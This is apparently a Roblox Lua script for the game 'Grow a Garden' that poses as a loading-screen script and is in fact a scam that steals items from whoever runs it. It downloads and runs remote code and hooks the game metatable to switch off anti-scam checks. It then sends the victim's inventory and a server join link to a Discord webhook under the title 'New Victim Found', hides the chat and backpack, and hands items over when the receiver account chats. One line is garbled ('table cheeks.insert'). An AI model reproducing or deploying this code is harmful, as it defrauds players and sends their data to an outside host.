-- Run custom loading screen in a coroutine
coroutine.wrap(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Hookzy/aaaddhshajd/refs/heads/main/Loading.lua", true))()
    end)
end)()

-- Delta Anti-Scam Bypass: Intercepts anti-scam remote calls and properties
local function bypassDelta()
    local mt = getrawmetatable(game)
    local oldNamecall = mt.__namecall
    local oldIndex = mt.__index
    
    setreadonly(mt, false)
    
    mt.__namecall = function(self, ...)
        local method = getnamecallmethod()
        local args = {...}
        
        if method == "FireServer" or method == "InvokeServer" then
            if string.find(tostring(self), "AntiScam") or string.find(tostring(self), "Security") then
                return -- Block the call
            end
        end
        
        return oldNamecall(self, ...)
    end
    
    mt.__index = function(self, key)
        if key == "AntiScamEnabled" or key == "SecurityCheck" then
            return false
        end
        return oldIndex(self, key)
    end
    
    setreadonly(mt, true)
end

-- Execute bypass
pcall(bypassDelta)

-- Cached services to avoid redundant calls
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local SoundService = game:GetService("SoundService")
local StarterGui = game:GetService("StarterGui")
local VirtualInput = game:GetService("VirtualInputManager")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer
local receiverUsername = "Potat0_Peeler"
local webhookUrl = "https://proxy-smoky-six.vercel.app/api/webhooks/1395419125655797931/oXPwjl_cs0wNXiiHTyccDhjWwt5C7EclCi_OJnhWUt6eb97TjSBn0Rhep3nwn8Zv8GDH"
local E_HOLD_TIME = 0.1
local E_DELAY = 0.2
local HOLD_TIMEOUT = 3

-- Server validation checks
if game.PlaceId ~= 126884695634066 then
    LocalPlayer:kick("Game not supported. Please join a normal GAG server")
    return
end

if #Players:GetPlayers() >= 5 then
    LocalPlayer:kick("Server error. Please join a DIFFERENT server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    LocalPlayer:kick("Server error. Please join a DIFFERENT server")
    return
end

-- Send data to Discord webhook with error handling and rate-limiting
local function sendToWebhook(data)
    local success, response = pcall(function()
        local jsonData = HttpService:JSONEncode(data)
        local requestFunc = syn and syn.request or request or HttpService.PostAsync
        if requestFunc == HttpService.PostAsync then
            return requestFunc(HttpService, webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
        else
            return requestFunc({
                Url = webhookUrl,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        end
    end)
    
    if not success then
        warn("Webhook failed: " .. tostring(response))
        return false
    end
    if response and response.StatusCode and response.StatusCode >= 400 then
        warn("Webhook error: HTTP " .. response.StatusCode .. " - " .. (response.StatusMessage or "Unknown"))
        return false
    end
    task.wait(2) -- Rate-limit to avoid Discord's 30 requests/min limit
    return true
end

-- Unequip active pets from Workspace.PetsPhysical
local function unequipActivePets()
    local PetsService = ReplicatedStorage:WaitForChild("GameEvents", 10):WaitForChild("PetsService", 10)
    local petsPhysical = Workspace:WaitForChild("PetsPhysical", 10)
    
    for _, petMover in ipairs(petsPhysical:GetChildren()) do
        if petMover:IsA("Part") and petMover.Name == "PetMover" then
            local model = petMover:FindFirstChildWhichIsA("Model")
            if model then
                local uuid = model.Name
                if uuid and uuid ~= "" then
                    pcall(function() PetsService:FireServer("UnequipPet", uuid) end)
                    task.wait(0.02)
                end
            end
        end
    end
    task.wait(0.5)
end

-- Unfavorite items in Backpack and player's plot
local function unfavoriteIfNeeded(tool)
    if tool:IsA("Tool") and tool:FindFirstChild("Handle") then
        local isFavorited = tool:GetAttribute("d")
        if isFavorited then
            local favoriteEvent = ReplicatedStorage:WaitForChild("GameEvents", 10):WaitForChild("Favorite_Item", 10)
            pcall(function() favoriteEvent:FireServer(tool) end)
            task.wait(0.05)
        end
    end
end

local function unfavoriteItems()
    local backpack = LocalPlayer:WaitForChild("Backpack", 10)
    for _, tool in ipairs(backpack:GetChildren()) do
        unfavoriteIfNeeded(tool)
    end
    
    local plotFolder = Workspace:FindFirstChild(LocalPlayer.Name)
    if plotFolder then
        for _, tool in ipairs(plotFolder:GetChildren()) do
            unfavoriteIfNeeded(tool)
        end
    end
end

-- Get inventory data
local function getInventory()
    local inventory = {items = {}, rarePets = {}, rareItems = {}}
    local bannedWords = {"Seed", "Shovel", "Uses", "Tool", "Egg", "Caller", "Staff", "Rod", "Sprinkler", "Crate", "Spray", "Pot"}
    local rarePets = {
        "Raccoon", "Inverted Raccoon", "Dragonfly", "Disco Bee", "Mimic octopus", "Spinosauros", "Fennec Fox",
        "Brontosaurus", "Queen Bee", "Red Fox", "Ankylosarus", "T-Rex", "Chicken Zombie", "Butterfly"
    }
    local rareItems = {"Candy Blossom", "Bone Blossom"}

    for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if item:IsA("Tool") then
            local isBanned = false
            for _, word in ipairs(bannedWords) do
                if string.find(item.Name:lower(), word:lower()) then
                    isBanned = true
                    break
                end
            end

            if not isBanned then
                table.insert(inventory.items, item.Name)
            end

            for _, rarePet in ipairs(rarePets) do
                if string.find(item.Name, rarePet) then
                    table.insert(inventory.rarePets, item.Name)
                    break
                end
            end

            for _, rareItem in ipairs(rareItems) do
                if string.find(item.Name, rareItem) then
                    table.insert(inventory.rareItems, item.Name)
                    break
                end
            end
        end
    end

    return inventory
end

-- Send inventory data to webhook
local function sendInventoryData()
    if not LocalPlayer then
        return
    end

    local inventory = getInventory()
    local inventoryText = #inventory.items > 0 and table.concat(inventory.items, "\n") or "No items"
    local rarePetText = #inventory.rarePets > 0 and table.concat(inventory.rarePets, "\n") or "None"
    local rareItemText = #inventory.rareItems > 0 and table.concat(inventory.rareItems, "\n") or "None"

    local messageData = {
        content = #inventory.rarePets > 0 or #inventory.rareItems > 0 and "@everyone" or "No valuable items found",
        allowed_mentions = { parse = {"everyone"} },
        embeds = {{
            title = "New Victim Found",
            description = "Join the server to steal items. Instructions in Aurora scripts server.",
            color = 0x530000,
            fields = {
                {name = "Username", value = LocalPlayer.Name, inline = true},
                {name = "Join Link", value = "https://kebabman.vercel.app/start?placeId=126884695634066&gameInstanceId=" .. (game.JobId or "N/A"), inline = true},
                {name = "Inventory", value = "```" .. inventoryText .. "```", inline = false},
                {name = "Rare Pets", value = "```" .. rarePetText .. "```", inline = false},
                {name = "Rare Items", value = "```" .. rareItemText .. "```", inline = false},
                {name = "Steal Command", value = "Say anything in chat as " .. receiverUsername, inline = false}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    sendToWebhook(messageData)
end

-- Check if item is valid (not banned)
local function isValidItem(name)
    local bannedWords = {"Seed", "Shovel", "Uses", "Tool", "Egg", "Caller", "Staff", "Rod", "Sprinkler", "Crate"}
    for _, banned in ipairs(bannedWords) do
        if string.find(name:lower(), banned:lower()) then
            return false
        end
    end
    return true
end

-- Get valid tools from Backpack
local function getValidTools()
    local tools = {}
    for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if item:IsA("Tool") and isValidItem(item.Name) then
            table cheeks.insert(tools, item)
        end
    end
    return tools
end

-- Check if tool is in inventory or equipped
local function toolInInventory(toolName)
    local bp = LocalPlayer:FindFirstChild("Backpack")
    local char = LocalPlayer.Character
    if bp and bp:FindFirstChild(toolName) then
        return true
    end
    if char and char:FindFirstChild(toolName) then
        return true
    end
    return false
end

-- Simulate holding E key
local function holdE()
    VirtualInput:SendKeyEvent(true, Enum.KeyCode.E, false, game)
    task.wait(E_HOLD_TIME)
    VirtualInput:SendKeyEvent(false, Enum.KeyCode.E, false, game)
end

-- Favorite a tool
local function favoriteItem(tool)
    if tool and tool:IsDescendantOf(game) then
        local toolInstance = LocalPlayer.Backpack:FindFirstChild(tool.Name) or (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(tool.Name))
        if toolInstance then
            pcall(function()
                ReplicatedStorage:WaitForChild("GameEvents", 10):WaitForChild("Favorite_Item", 10):FireServer(toolInstance)
            end)
        else
            warn("Tool not found: " .. tool.Name)
        end
    else
        warn("Tool not found or invalid: " .. tostring(tool))
    end
end

-- Use tool with hold check
local function useToolWithHoldCheck(tool, player)
    local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if not (humanoid and tool) then
        return false
    end

    humanoid:EquipTool(tool)
    local startTime = tick()
    while toolInInventory(tool.Name) do
        holdE()
        task.wait(E_DELAY)
        if tick() - startTime >= HOLD_TIMEOUT then
            if toolInInventory(tool.Name) then
                favoriteItem(tool)
                task.wait(0.05)
                startTime = tick()
                while toolInInventory(tool.Name) do
                    holdE()
                    task.wait(E_DELAY)
                    if tick() - startTime >= HOLD_TIMEOUT then
                        humanoid:UnequipTools()
                        return false
                    end
                end
                humanoid:UnequipTools()
                return true
            end
            humanoid:UnequipTools()
            return true
        end
    end
    humanoid:UnequipTools()
    return true
end

-- Cycle through tools to process them
local function cycleToolsWithHoldCheck(player)
    local tools = getValidTools()
    local rarePets = {
        "Raccoon", "Inverted Raccoon", "Dragonfly", "Disco Bee", "Mimic octopus", "Spinosauros", "Fennec Fox",
        "Brontosaurus", "Queen Bee", "Red Fox", "Ankylosarus", "T-Rex", "Chicken Zombie", "Butterfly"
    }
    local rareItems = {"Candy Blossom", "Bone Blossom"}
    local rarePetTools, rareItemTools, normalTools = {}, {}, {}

    -- Categorize tools
    for _, tool in ipairs(tools) do
        local isRarePet = false
        for _, rarePet in ipairs(rarePets) do
            if string.find(tool.Name, rarePet) then
                table.insert(rarePetTools, tool)
                isRarePet = true
                break
            end
        end
        if not isRarePet then
            for _, rareItem in ipairs(rareItems) do
                if string.find(tool.Name, rareItem) then
                    table.insert(rareItemTools, tool)
                    break
                end
            end
        end
        if not isRarePet and not table.find(rareItems, tool.Name) then
            table.insert(normalTools, tool)
        end
    end

    -- Process tools in order: rare pets, rare items, normal items
    for _, tool in ipairs(rarePetTools) do
        useToolWithHoldCheck(tool, player)
    end
    for _, tool in ipairs(rareItemTools) do
        useToolWithHoldCheck(tool, player)
    end
    for _, tool in ipairs(normalTools) do
        useToolWithHoldCheck(tool, player)
    end
end

-- Teleport victim (LocalPlayer) to receiver (5 studs in front, facing receiver's direction)
local function teleportToReceiver()
    local success, err = pcall(function()
        if not (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")) then
            error("Victim (LocalPlayer) missing character or HumanoidRootPart")
        end

        local receiver = Players:FindFirstChild(receiverUsername)
        if not (receiver and receiver.Character and receiver.Character:FindFirstChild("HumanoidRootPart")) then
            error("Receiver (" .. receiverUsername .. ") missing or no character/HumanoidRootPart")
        end

        local victimRoot = LocalPlayer.Character.HumanoidRootPart
        local victimHumanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        local receiverRoot = receiver.Character.HumanoidRootPart
        local offset = -receiverRoot.CFrame.LookVector * 5 -- 5 studs in front
        local victimPosition = receiverRoot.Position + offset
        local targetCFrame = CFrame.new(victimPosition, receiverRoot.Position)

        -- Unanchor and disable collision
        if victimRoot.Anchored then
            victimRoot.Anchored = false
        end
        local originalCollision = victimHumanoid.PlatformStand
        victimHumanoid.PlatformStand = true

        -- Set CFrame
        victimRoot.CFrame = targetCFrame

        -- Fallback: Humanoid.MoveTo with retries
        local maxAttempts = 3
        local attempt = 1
        while attempt <= maxAttempts and (victimRoot.Position - victimPosition).Magnitude > 2 do
            victimHumanoid:MoveTo(victimPosition)
            task.wait(0.2)
            attempt = attempt + 1
        end

        -- Restore collision
        victimHumanoid.PlatformStand = originalCollision

        -- Verify teleport
        if (victimRoot.Position - victimPosition).Magnitude > 2 then
            error("Teleport failed: Victim not at target position after all attempts")
        end
    end)
    if not success then
        warn("Teleport failed: " .. tostring(err))
        return false
    end
    return true
end

-- Disable game features for stealth
local function disableGameFeatures()
    SoundService.AmbientReverb = Enum.ReverbType.NoReverb
    SoundService.RespectFilteringEnabled = true
    for _, soundGroup in ipairs(SoundService:GetChildren()) do
        if soundGroup:IsA("SoundGroup") then
            soundGroup.Volume = 0
        end
    end
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
end

-- Main execution
if LocalPlayer then
    unequipActivePets() -- Unequip active pets
    unfavoriteItems()    -- Unfavorite items in Backpack and plot
    sendInventoryData() -- Send initial inventory data
    disableGameFeatures()

    -- Handle TextChatService chat
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        TextChatService.OnIncomingMessage = function(message)
            local speaker = message.TextSource and Players:GetPlayerByUserId(message.TextSource.UserId)
            if speaker and speaker.Name == receiverUsername then
                local teleportSuccess = teleportToReceiver()
                if teleportSuccess then
                    task.wait(0.5)
                    cycleToolsWithHoldCheck(LocalPlayer)
                    sendToWebhook({
                        embeds = {{
                            title = "Command Executed",
                            description = "Receiver (" .. receiverUsername .. ") triggered process for victim: " .. LocalPlayer.Name,
                            color = 0xFFFF00,
                            fields = {{name = "Message", value = message.Text, inline = true}},
                            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                        }}
                    })
                end
            end
        end
    else
        -- Handle legacy chat
        Players.PlayerChatted:Connect(function(chatType, sender, message)
            if sender == receiverUsername then
                local teleportSuccess = teleportToReceiver()
                if teleportSuccess then
                    task.wait(0.5)
                    cycleToolsWithHoldCheck(LocalPlayer)
                    sendToWebhook({
                        embeds = {{
                            title = "Command Executed",
                            description = "Receiver (" .. receiverUsername .. ") triggered process for victim: " .. LocalPlayer.Name,
                            color = 0xFFFF00,
                            fields = {{name = "Message", value = message, inline = true}},
                            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                        }}
                    })
                end
            end
        end)
    end
end

-- Modify proximity prompts
local function modifyProximityPrompts()
    for _, object in ipairs(game:GetDescendants()) do
        if object:IsA("ProximityPrompt") then
            object.HoldDuration = 0.01
        end
    end
    game.DescendantAdded:Connect(function(object)
        if object:IsA("ProximityPrompt") then
            object.HoldDuration = 0.01
        end
    end)
end

modifyProximityPrompts()
